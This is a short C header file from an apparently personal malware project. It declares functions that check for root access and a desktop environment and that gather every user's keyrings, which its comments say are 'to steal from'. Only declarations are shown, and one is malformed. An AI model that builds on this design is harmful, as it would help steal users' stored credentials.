// environment.h
// Copyright (c) 2024 Roan Rothrock

// I'd like to think it's rather essential that for malware to
// function, it needs to be aware of its surroundings. Functions that
// lie here exist in an attempt for this program to understand its
// surroundings.

#ifndef __ENVIRONMENT_H
#define __ENVIRONMENT_H

// asserts that EUID == 0 (root)
void assert_euid(void);

// there's not really going to be much to do if the system lacks a
// desktop environment
void assert_freedesktop_install(void);

// asserts that there are keyrings to steal from
void assert_keyrings(void);

// gets keyrings for any/all users with a home directory
**char get_keyrings(void);

#endif /* __ENVIRONMENT_H */